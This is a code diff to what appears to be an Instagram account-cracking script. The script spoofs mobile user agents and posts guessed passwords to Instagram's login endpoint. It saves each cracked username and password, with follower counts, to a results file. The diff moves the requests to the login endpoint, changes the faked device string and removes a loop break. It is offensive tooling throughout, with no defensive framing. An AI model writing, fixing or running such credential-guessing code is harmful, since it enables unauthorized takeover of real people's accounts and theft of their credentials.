@@ -651,8 +651,8 @@ class instagram:
                 k=random.randrange(40,150)
                 l='Mobile Safari/537.36'
                 uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-                uafake=f"Instagram 244.0.0.12.112 (iPhone12,1; iOS {str(rr(4,12))}; Mac OS X) {str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) en_US; en-US; scale=2.00; 828x1792; 383361019)"
-                token=s.get('https://z-p42.www.instagram.com/accounts/logout/ajax/')
+                uafake=f"Instagram 244.0.0.12.112 (iPhone14,1; iOS {str(rr(4,12))}; Mac OS X) {str(rc(aZ))}{str(rr(1111,9999))}{str(rc(aZ))}) en_US; en-US; scale=2.00; 828x1792; 383361019)"
+                token=s.get('https://z-p42.www.instagram.com/api/v1/web/accounts/login/ajax/')
                 headers = {
                     'Host':'www.instagram.com',
                     'connection':'keep-alive',
@@ -672,7 +672,7 @@ class instagram:
                     'sec-fetch-site':'same-origin',
                     'sec-fetch-mode':'cors',
                     'sec-fetch-dest':'empty',
-                    'referer':'https://z-p42.www.instagram.com/accounts/logout/ajax/',
+                    'referer':'https://z-p42.www.instagram.com/api/v1/web/accounts/login/ajax/',
                     'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                 param={
                     "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
@@ -692,7 +692,7 @@ class instagram:
                     os.popen("play-audio data/live.mp3")
                     open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                     success.append(user)
-                    break
+                    
 
                 elif 'checkpoint_url' in str(x_jason):
                     nama,pengikut,mengikut,postingan=self.APIinfo(user)
